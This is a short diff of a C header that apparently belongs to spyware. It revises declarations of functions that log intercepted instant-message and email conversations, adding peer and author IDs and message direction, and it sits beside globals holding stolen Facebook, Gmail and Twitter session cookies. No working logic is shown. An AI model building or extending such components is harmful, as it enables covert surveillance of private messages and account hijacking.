@@ -42,8 +42,8 @@ extern social_entry_struct social_entry[SOCIAL_ENTRY_COUNT];
 extern void urldecode(char *src);
 extern void JsonDecode(char *string);
 extern void CheckProcessStatus();
-extern void LogSocialIMMessageA(char *program, char *topic, char *peers, char *author, char *body, struct tm *tstamp);
-extern void LogSocialIMMessageW(WCHAR *program, WCHAR *topic, WCHAR *peers, WCHAR *author, WCHAR *body, struct tm *tstamp);
+extern void LogSocialIMMessageA(DWORD program, char *peers, char *peers_id, char *author, char *author_id, char *body, struct tm *tstamp, BOOL is_incoming);
+extern void LogSocialIMMessageW(DWORD program, WCHAR *peers, WCHAR *peers_id, WCHAR *author, WCHAR *author_id, WCHAR *body, struct tm *tstamp, BOOL is_incoming);
 extern void LogSocialMailMessage(DWORD program, char *from, char *rcpt, char *cc, char *subject, char *body, BOOL is_incoming);
 extern void LogSocialMailMessageFull(DWORD program, BYTE *raw_mail, DWORD size, BOOL is_incoming);
 
@@ -51,6 +51,8 @@ extern char FACEBOOK_IE_COOKIE[1024];
 extern char GMAIL_IE_COOKIE[1024];
 extern char TWITTER_IE_COOKIE[1024];
 
+#define CHAT_PROGRAM_FACEBOOK 0x02
+#define CHAT_PROGRAM_TWITTER  0x03
 
 
 
